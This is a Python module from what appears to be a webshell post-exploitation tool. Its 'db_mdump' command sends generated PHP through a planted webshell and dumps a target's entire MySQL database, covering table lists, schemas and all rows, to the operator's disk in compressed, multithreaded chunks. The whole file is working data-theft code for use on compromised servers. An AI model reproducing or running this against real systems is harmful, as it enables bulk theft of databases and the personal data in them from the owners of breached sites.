from os import path, makedirs
from concurrent.futures import ThreadPoolExecutor, wait, as_completed, ALL_COMPLETED
from threading import Lock
from base64 import b64decode, encode

from libs.config import alias, color, gget
from libs.myapp import send, get_db_connect_code, gzinflate


LOCK = Lock()


def get_table_name_php(database):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        return """%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $content="";
    $table_list = $con->query("show tables");
    while($table_data = $table_list->fetch(PDO::FETCH_BOTH)){
        $content .= $table_data[0]."\\n";
    }
    echo $content;
    """ % (get_db_connect_code(dbname=database))
    elif (connect_type == "mysqli"):
        return"""%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $content="";
    $table_list = mysqli_query($con,"show tables");
    while($table_data = mysqli_fetch_array($table_list)){
        $content .= $table_data[0]."\\n";
    }
    echo $content;
    """ % (get_db_connect_code(dbname=database))
    else:
        return ""


def get_table_row_number(database, table):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        php = """%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $content="";
    $table="%s";
    $table_list = $con->query("select count(*) from $table;");
    $result = $table_list->fetchAll();
    echo $result[0][0];
    """ % (get_db_connect_code(dbname=database), table)
    elif (connect_type == "mysqli"):
        php = """%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $table="%s";
    $table_list = mysqli_query($con,"select count(*) from $table;");
    $result = mysqli_fetch_all($table_list);
    echo $result[0][0];
    """ % (get_db_connect_code(dbname=database), table)
    else:
        php = ""
    res = send(php)
    try:
        return int(res.r_text.strip())
    except ValueError:
        return -1

def get_table_construct(database, table, encoding):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        php = """%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $table_name="%s";
    $table_created_data = $con->query("show create table `$table_name`");
    $table_created_data_array = $table_created_data->fetch(PDO::FETCH_BOTH);
    $struct=str_replace("NOT NULL", "", $table_created_data_array['Create Table']);
    $content .= "DROP TABLE IF EXISTS `$table_name`;\\r\\n".$struct.";\\r\\n\\r\\n";
    echo base64_encode(gzdeflate($content));
    """ % (get_db_connect_code(dbname=database), table)
    elif (connect_type == "mysqli"):
        php = """%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $table_name="%s";
    $table_created_data = mysqli_query($con,"show create table `$table_name`");
    $table_created_data_array = mysqli_fetch_array($table_created_data);
    $struct=str_replace("NOT NULL", "", $table_created_data_array['Create Table']);
    $content .= "DROP TABLE IF EXISTS `$table_name`;\\r\\n".$struct.";\\r\\n\\r\\n";
    echo base64_encode(gzdeflate($content));
    """ % (get_db_connect_code(dbname=database), table)
    else:
        php = ""
    retry_time = 5
    text = None
    while retry_time and text == None:
        res = send(php)
        try:
            text = gzinflate(b64decode(res.r_content.strip()))
        except Exception:
            text = None
    return text if text else ""


def get_data(database, table, encoding, offset, blocksize):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        php = """%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $table_name="%s";
    $offset=%s;
    $size=%s;
    $content = "";
    $table_records = $con->query("select * from $table_name limit $offset,$size;");
    while($record = $table_records->fetch(PDO::FETCH_ASSOC)){
    $vals = "'".join("','",array_map('addslashes',array_values($record)))."'";
    $content .= "insert into `$table_name` values($vals);\\r\\n";
    }
    echo base64_encode(gzdeflate($content));
    """ % (get_db_connect_code(dbname=database), table, offset, blocksize)
    elif (connect_type == "mysqli"):
        php = """%s
    if(!$con){
        die("Error : connect to sql failed...");
    }
    $table_name="%s";
    $offset=%s;
    $size=%s;
    $content = "";
    $table_records = $con->query("select * from $table_name limit $offset,$size;");
    while($record = mysqli_fetch_assoc($table_records)){
    $vals = "'".join("','",array_map('mysql_real_escape_string',array_values($record)))."'";
    $content .= "insert into `$table_name` values($vals);\\r\\n";
    }
    echo base64_encode(gzdeflate($content));
    """ % (get_db_connect_code(dbname=database), table, offset, blocksize)
    else:
        php = ""
    retry_time = 5
    text = None
    while retry_time and text == None:
        res = send(php)
        try:
            text = gzinflate(b64decode(res.r_content.strip()))
        except Exception:
            text = None
    return text if text else ""


def thread_dump(database, table, encoding, download_path, blocksize, threads):
    global LOCK
    table = table if table else "None"
    retry_time = 5
    row_number = -1
    while retry_time and row_number == -1:
        row_number = get_table_row_number(database, table)
        retry_time -= 1
        if (row_number != -1):
            with LOCK:
                print(f"[Retry] fetch {database}.{table} [rows: {row_number}]")
    if (row_number == -1):
        with LOCK:
            print(color.red(f"[Error] fetch {database}.{table}"))
        return
    file_name = f"{database}.{table}.sql"
    file_path = path.join(download_path, file_name).replace("\\", "/")
    with LOCK:
        print(color.yellow(
            f"[Try] fetch {database}.{table} [rows: {row_number}]"))
    with open(file_path, "wb") as f, ThreadPoolExecutor(max_workers=threads) as tp:
        f.write(get_table_construct(database, table, encoding))
        f.flush()
        
        all_task = [tp.submit(get_data, database, table, encoding, offset, blocksize)
                    for offset in range(0, row_number, blocksize)]
        for future in as_completed(all_task):
            result = future.result()
            if (result):
                f.write(future.result())
                f.flush()
        with LOCK:
            print(color.green(
                f"[Success] fetch {database}.{table} [rows: {row_number}]"))


@alias(True, _type="DATABASE", db="database", l="local_path", s="blocksize", ex="exclude", i="include", t="threads")
def run(database: str = "", local_path: str = "", encoding: str = "utf8", blocksize: int = 1000, exclude: str = "", include: str = "", threads: int = 5):
    """
    db_mdump

    Dump a database to a file by block compression and multi threads, Default file name is {database}.sql.
    You can use exclude options to exclude some tables.
    You can also use include options to dump only some tables.

    eg: db_mdump {database=current_database} {local_path=doughnuts/target/site.com/{database}.sql} {encoding="utf-8"} {blocksize=1000} {exclude="",eg="table1,table2"} {include="",eg="table1,table2"} {threads=5}
    """
    global LOCK
    if (not gget("db_connected", "webshell")):
        print(color.red("Please run db_init command first"))
        return
    database = database if database else gget("db_dbname", "webshell")
    download_path = local_path or gget("webshell.download_path", "webshell")
    if not path.exists(download_path):
        makedirs(download_path)
    res = send(get_table_name_php(database))
    if (not res):
        return
    tables = res.r_text.strip()
    with LOCK:
        print(color.yellow(f"\n[Try] Dump {database}\n"))
    with ThreadPoolExecutor(max_workers=threads) as tp:
        all_task = [tp.submit(thread_dump, database, table, encoding, download_path, blocksize, threads) for table in tables.split("\n") if table not in exclude.split(",")] if (
            not include) else [tp.submit(thread_dump, database, table, encoding, download_path, blocksize, threads) for table in tables.split("\n") if table in include.split(",")]
        wait(all_task, return_when=ALL_COMPLETED)
        with LOCK:
            print(color.green(f"\n[Success] Dump {database}\n"))
